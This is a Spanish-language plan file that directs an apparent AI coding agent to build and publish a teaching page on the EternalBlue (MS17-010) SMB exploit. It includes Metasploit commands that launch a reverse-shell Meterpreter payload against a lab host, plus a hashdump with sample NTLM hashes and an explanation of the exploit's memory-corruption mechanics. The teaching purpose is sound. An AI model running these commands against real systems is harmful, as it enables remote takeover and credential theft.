---
phase: 02-contenido-y-publicacion
plan: 01
type: execute
wave: 1
depends_on: []
files_modified:
  - index.html
autonomous: true
requirements:
  - CONT-01
  - CONT-02
  - CONT-03
  - CONT-04
  - CONT-05
  - CONT-06
  - CONT-07
  - UX-01
  - UX-02
  - UX-03
  - UX-04

must_haves:
  truths:
    - "La página muestra 4 secciones en orden: Contexto, Fases del Ataque, Lab (3 pasos), Mapeo MITRE"
    - "La mecánica de Metasploit (kernel→usuario, TCP encapsulation, pool grooming) está explicada en texto"
    - "Los 3 pasos del lab muestran comandos exactos con salida esperada en bloques monospace"
    - "La tabla MITRE tiene al menos las 3 filas de EternalBlue (T1046, T1210, T1068)"
    - "Hay al menos 2 preguntas interactivas visualmente diferenciadas"
    - "La indicación '15 minutos' y los tiempos por sección son visibles en la página"
    - "Todos los comandos shell/Metasploit están en elementos pre/code con fondo distinto al texto"
  artifacts:
    - path: "index.html"
      provides: "Página completa con todo el contenido de la clase"
      min_lines: 200
      contains: "CVE-2017-0143"
    - path: "index.html"
      provides: "Tabla MITRE ATT&CK"
      contains: "T1210"
    - path: "index.html"
      provides: "Bloques de código monospace"
      contains: "pre"
  key_links:
    - from: "index.html"
      to: "GitHub Pages"
      via: "git push origin master:main"
      pattern: "ollerenac.github.io/clase_modelo"
---

## Phase Goal

**As a** docente, **I want to** presentar la clase de EternalBlue con todo el contenido técnico estructurado en la página, **so that** puedo dictar los 15 minutos de clase modelo navegando una sola URL sin notas adicionales.

<objective>
Reemplazar el placeholder de index.html con el contenido completo de la clase modelo: contexto de la vulnerabilidad, fases del ataque, mecánica del exploit, lab de 3 pasos, tabla MITRE ATT&CK, preguntas interactivas, y estructura de tiempos — todo en un archivo HTML+CSS autocontenido. Publicar en GitHub Pages.

Purpose: La página en https://ollerenac.github.io/clase_modelo debe ser el único material que el docente necesita durante la presentación oral de 15 minutos.

Output: index.html completo (200+ líneas), commiteado y publicado en main.
</objective>

<execution_context>
@$HOME/.claude/get-shit-done/workflows/execute-plan.md
@$HOME/.claude/get-shit-done/templates/summary.md
</execution_context>

<context>
@/home/researcher/Teaching/inictel/clase_modelo/.planning/ROADMAP.md
@/home/researcher/Teaching/inictel/clase_modelo/.planning/REQUIREMENTS.md
@/home/researcher/Teaching/inictel/clase_modelo/CLAUDE.md
@/home/researcher/Teaching/inictel/clase_modelo/.planning/phases/01-repo-e-infraestructura/01-SKELETON.md
</context>

<tasks>

<task type="auto" tdd="false">
  <name>Task 1: Escribir index.html completo con contenido, estilos y estructura</name>

  <read_first>
  1. /home/researcher/Teaching/inictel/clase_modelo/index.html — estado actual (skeleton con placeholder)
  2. /home/researcher/Teaching/inictel/clase_modelo/CLAUDE.md — restricciones del proyecto
  3. /home/researcher/Teaching/inictel/clase_modelo/.planning/phases/01-repo-e-infraestructura/01-SKELETON.md — decisiones arquitectónicas bloqueadas
  4. /home/researcher/Teaching/untels/ollerenacastro.github.io/_posts/2026-05-31-tema03.md líneas 1512–1761 — ÚNICA fuente de contenido técnico válida (sección "Kill Chain 3: EternalBlue / MS17-010")
  </read_first>

  <files>index.html</files>

  <action>
  Reemplazar el contenido completo de index.html. El archivo debe quedar autocontenido: un único bloque style en head, sin archivos CSS/JS externos.

  ESTRUCTURA HTML (en este orden, con estos id de sección):

  1. header — título h1 "Clase Modelo: EternalBlue / MS17-010" + badge "15 minutos" visible
  2. section#contexto — "Contexto de la Vulnerabilidad" (tiempo sugerido: ~3 min)
  3. section#fases — "Fases del Ataque" (tiempo sugerido: ~3 min)
  4. section#lab — "Laboratorio" con subsecciones h3 para Paso 0, Paso 1, Paso 2, Paso 3 (tiempo sugerido: ~6 min)
  5. section#mitre — "Mapeo MITRE ATT&CK" (tiempo sugerido: ~2 min)
  6. section#preguntas — "Preguntas para la Clase" (tiempo sugerido: ~1 min)

  CONTENIDO A INCLUIR (extraído estrictamente de las líneas 1512-1761 de tema03.md):

  section#contexto debe contener:
  - EternalBlue (CVE-2017-0143), exploit de SMBv1, desarrollado por NSA, filtrado por Shadow Brokers 2017
  - Usado en WannaCry y NotPetya
  - Metasploitable3 (Windows Server 2008 R2): SMBv1 habilitado, sin parche MS17-010

  section#fases debe contener:
  - Reconocimiento: identificar puerto 445/SMBv1 activo con nmap
  - Acceso inicial: explotación remota sin credenciales via SMBv1
  - Mecánica de Metasploit — explicar en prosa los siguientes puntos exactos del source:
    a) make_kernel_user_payload: shellcode kernel (anillo 0) + payload Meterpreter (anillo 3), unidos; el shellcode kernel usa APC para inyectar Meterpreter en spoolsv.exe
    b) smb_eternalblue 4 pasos (Step 1: Connect IPC$, Step 2: Large SMB1 buffer, Step 3: Pool grooming alternando SMBv1/SMBv2, Step 4: Send payload)
    c) create_fea_list: bug aritmético DWORD vs WORD en SrvOs2FeaListSizeToNt() causa underflow → buffer diminuto → memmove overflow controlado

  section#lab debe contener exactamente estos comandos (usar elemento pre>code para cada bloque):

  Paso 0 (inspección del módulo):
    msfconsole -q
    use exploit/windows/smb/ms17_010_eternalblue
    info

  Paso 1 (confirmar vulnerabilidad):
    sudo nmap --script vuln -p 445 10.0.2.15
  Output esperado (incluir en bloque pre separado):
    | smb-vuln-ms17-010:
    |   VULNERABLE:
    |     State: VULNERABLE
    |     IDs:  CVE:CVE-2017-0143

  Paso 2 (explotar):
    msfconsole -q
    use exploit/windows/smb/ms17_010_eternalblue
    set RHOSTS 10.0.2.15
    set LHOST 10.0.2.9
    set payload windows/x64/meterpreter/reverse_tcp
    run
  Output esperado:
    [*] Meterpreter session 1 opened (10.0.2.9:4444 -> 10.0.2.15:XXXXX)
    meterpreter > getuid
    Server username: NT AUTHORITY\SYSTEM
  Nota sobre BSOD: incluir la nota del source sobre que el reboot indica intento fallido, no éxito.

  Paso 3 (post-explotación):
    meterpreter > sysinfo
    meterpreter > getuid
    meterpreter > hashdump
  Output esperado de hashdump:
    Administrator:500:aad3b435b51404eeaad3b435b51404ee:e02bc503339d51f71d913c245d35b50b:::
    vagrant:1000:aad3b435b51404eeaad3b435b51404ee:e02bc503339d51f71d913c245d35b50b:::

  section#mitre debe contener una tabla HTML con estas 3 filas de EternalBlue (extraídas exactamente de la tabla del source, líneas 1758-1760):
  - Fila 1: "Confirmación de vulnerabilidad SMBv1" | EternalBlue | Discovery | T1046 — Network Service Discovery
  - Fila 2: "Explotación SMBv1 remota" | EternalBlue | Lateral Movement | T1210 — Exploitation of Remote Services
  - Fila 3: "Obtención de shell SYSTEM" | EternalBlue | Privilege Escalation | T1068 — Exploitation for Privilege Escalation
  Columnas de la tabla: Etapa | Kill Chain | Táctica | Técnica

  section#preguntas debe contener exactamente 2 preguntas (crear preguntas coherentes con el contenido — el source no las enumera explícitamente, usar criterio docente):
  - Pregunta 1 (post-concepto teórico, insertar al final de section#fases o al inicio de section#preguntas): sobre la mecánica del exploit o la vulnerabilidad
  - Pregunta 2 (post-lab): sobre post-explotación o el significado de NT AUTHORITY\SYSTEM

  ESTILOS CSS (en bloque style en head):
  - body: font-family sans-serif, max-width 860px, margin auto, padding 0 1.5rem, color #1a1a1a, line-height 1.6
  - h1: fondo oscuro (#1a1a2e), color blanco, padding 1.5rem, margin negativo lateral para ancho completo
  - h2: color #c0392b (rojo), border-bottom 2px solid #c0392b, padding-bottom 0.3rem
  - h3: color #2c3e50
  - .tiempo (span o div): fondo #f39c12 (naranja), color blanco, font-size 0.8em, padding 0.2em 0.6em, border-radius 4px, float right
  - .badge-15min: visible en header, fondo #27ae60 (verde), color blanco, padding 0.3rem 0.8rem, border-radius 4px
  - pre: fondo #1e1e2e (casi negro), color #cdd6f4 (lavanda claro), padding 1rem, border-radius 6px, overflow-x auto, font-size 0.88em
  - code (inline): fondo #f4f4f4, color #c0392b, padding 0.1em 0.4em, border-radius 3px
  - table: border-collapse collapse, width 100%
  - th: fondo #2c3e50, color blanco, padding 0.5rem
  - td: border 1px solid #ddd, padding 0.5rem
  - tr:nth-child(even): fondo #f9f9f9
  - .pregunta: fondo #eaf4fb, border-left 4px solid #2980b9, padding 1rem, margin 1rem 0
  - section: margin-bottom 2.5rem

  INDICADORES DE TIEMPO:
  Cada h2 de sección debe tener un span.tiempo al lado con el tiempo sugerido:
  - #contexto: "~3 min"
  - #fases: "~3 min"
  - #lab: "~6 min"
  - #mitre: "~2 min"
  - #preguntas: "~1 min"
  El header debe mostrar el badge "15 min total" próximo al h1.

  RESTRICCIONES:
  - No inventar ni ampliar contenido técnico — solo extraer del source (líneas 1512-1761)
  - No crear archivos adicionales
  - Todo el contenido en español
  - No usar JavaScript (los elementos .pregunta son texto estático, no interactivos en runtime)
  </action>

  <verify>
    <automated>
      grep -c "CVE-2017-0143" /home/researcher/Teaching/inictel/clase_modelo/index.html
      grep -c "T1210" /home/researcher/Teaching/inictel/clase_modelo/index.html
      grep -c "hashdump" /home/researcher/Teaching/inictel/clase_modelo/index.html
      grep -c "pregunta" /home/researcher/Teaching/inictel/clase_modelo/index.html
      grep -c "tiempo" /home/researcher/Teaching/inictel/clase_modelo/index.html
      grep -c "&lt;pre&gt;\|<pre>" /home/researcher/Teaching/inictel/clase_modelo/index.html
    </automated>
  </verify>

  <acceptance_criteria>
  - grep -c "CVE-2017-0143" index.html returns >= 1
  - grep -c "T1210" index.html returns >= 1
  - grep -c "T1068" index.html returns >= 1
  - grep -c "T1046" index.html returns >= 1
  - grep -c "hashdump" index.html returns >= 1
  - grep -c "NT AUTHORITY" index.html returns >= 1
  - grep -c "ms17_010_eternalblue" index.html returns >= 2 (appears in Paso 0 and Paso 2)
  - grep -c "nmap --script vuln" index.html returns >= 1
  - grep -c "15 min" index.html returns >= 1
  - grep -c "pregunta\|Pregunta" index.html returns >= 2
  - grep -c "section" index.html returns >= 4 (4 main sections)
  - grep -c "<pre>" index.html returns >= 4 (at least one pre block per lab step)
  - grep -c "SMBv1\|SMB" index.html returns >= 3
  - wc -l index.html | awk '{print $1}' returns >= 200
  - El archivo es HTML válido: abre con DOCTYPE html y cierra con /html
  </acceptance_criteria>

  <done>
  index.html contiene: sección de contexto (CVE-2017-0143, SMBv1, NSA, WannaCry), fases del ataque con mecánica de Metasploit explicada, lab de 3 pasos con comandos exactos y salidas esperadas en bloques pre/code, tabla MITRE con T1046/T1210/T1068, 2 preguntas en div.pregunta, badges de tiempo (~3/~3/~6/~2/~1 min) en cada sección, badge "15 min total" en header. Estilos CSS inline con bloques pre de fondo oscuro visualmente distinguibles.
  </done>
</task>

<task type="auto">
  <name>Task 2: Commit y publicar en GitHub Pages</name>

  <read_first>
  1. /home/researcher/Teaching/inictel/clase_modelo/index.html — verificar que Task 1 completó el archivo correctamente antes de hacer commit
  2. /home/researcher/Teaching/inictel/clase_modelo/CLAUDE.md — confirmar repo y URL de destino
  </read_first>

  <files>index.html</files>

  <action>
  Desde el directorio /home/researcher/Teaching/inictel/clase_modelo:

  1. Verificar el estado del repo: git status
  2. Verificar que index.html tiene 200+ líneas: wc -l index.html
  3. Hacer stage del archivo: git add index.html
  4. Crear commit: git commit -m "feat(02): add full EternalBlue class content — all sections, MITRE table, interactive questions"
  5. Publicar en GitHub Pages: git push origin master:main

  Si git push falla por falta de credenciales, verificar con: git remote -v
  El remote debe apuntar a https://github.com/ollerenac/clase_modelo.git o git@github.com:ollerenac/clase_modelo.git

  NO crear nuevos archivos. NO modificar ningún archivo excepto index.html (que ya fue modificado en Task 1).
  </action>

  <verify>
    <automated>
      git -C /home/researcher/Teaching/inictel/clase_modelo log --oneline -3
    </automated>
    <human-check>
      Visitar https://ollerenac.github.io/clase_modelo en el navegador (esperar hasta 2 minutos para que GitHub Pages propague el cambio).
      Verificar que la página muestra secciones con encabezados coloreados, bloques de código con fondo oscuro, y la tabla MITRE ATT&CK.
    </human-check>
  </verify>

  <acceptance_criteria>
  - git log --oneline -1 muestra el commit con mensaje que contiene "EternalBlue" o "02"
  - git push termina sin error (exit code 0)
  - git status muestra "nothing to commit, working tree clean" tras el push
  - El commit contiene exactamente index.html como único archivo modificado: git show --name-only HEAD muestra solo "index.html"
  </acceptance_criteria>

  <done>
  El commit existe en el repo local y en la rama main remota. La URL https://ollerenac.github.io/clase_modelo sirve la página actualizada con todo el contenido de la clase.
  </done>
</task>

</tasks>

<threat_model>
## Trust Boundaries

| Boundary | Description |
|----------|-------------|
| local → GitHub | Código HTML commiteado y publicado en repo público |
| browser → GitHub Pages | Visitantes cargan HTML estático sin autenticación |

## STRIDE Threat Register

| Threat ID | Category | Component | Disposition | Mitigation Plan |
|-----------|----------|-----------|-------------|-----------------|
| T-02-01 | Information Disclosure | index.html (contenido educativo) | accept | El contenido es material educativo público por diseño; no contiene credenciales reales ni IPs de producción — las IPs 10.0.2.x son de laboratorio VirtualBox aislado |
| T-02-02 | Tampering | git push a rama main | accept | Repo privado del docente con autenticación GitHub; push requiere credenciales del propietario |
| T-02-SC | Tampering | npm/pip installs | accept | No hay instalación de paquetes en este plan — stack es HTML/CSS puro sin dependencias |
</threat_model>

<verification>
Verificaciones del plan completo:

1. Contenido completo presente:
   grep -c "CVE-2017-0143" index.html   # >= 1
   grep -c "T1210" index.html            # >= 1
   grep -c "hashdump" index.html         # >= 1
   grep -c "15 min" index.html           # >= 1

2. Estructura HTML correcta:
   grep -c "<section" index.html         # >= 4
   grep -c "<pre>" index.html            # >= 4
   grep -c "pregunta" index.html         # >= 2

3. Publicación:
   git log --oneline -1                  # muestra commit de este plan
   curl -s -o /dev/null -w "%{http_code}" https://ollerenac.github.io/clase_modelo   # 200
</verification>

<success_criteria>
1. index.html tiene 200+ líneas con las 4 secciones (contexto, fases, lab, MITRE) y sección de preguntas
2. La explicación de cómo Metasploit encapsula el exploit en TCP y cómo el receptor lo ejecuta está presente (make_kernel_user_payload, smb_eternalblue 4 pasos, create_fea_list)
3. Todos los comandos shell/Metasploit están en elementos pre con fondo oscuro visualmente distinguible
4. La indicación "15 min" y tiempos sugeridos por sección (~3/~3/~6/~2/~1) son visibles
5. Exactamente 2 preguntas interactivas (div.pregunta) integradas en la página
6. La tabla MITRE contiene las 3 filas de EternalBlue: T1046, T1210, T1068
7. La página carga en https://ollerenac.github.io/clase_modelo sin error
</success_criteria>

<output>
Crear /home/researcher/Teaching/inictel/clase_modelo/.planning/phases/02-contenido-y-publicacion/02-01-SUMMARY.md cuando el plan esté completo.
</output>
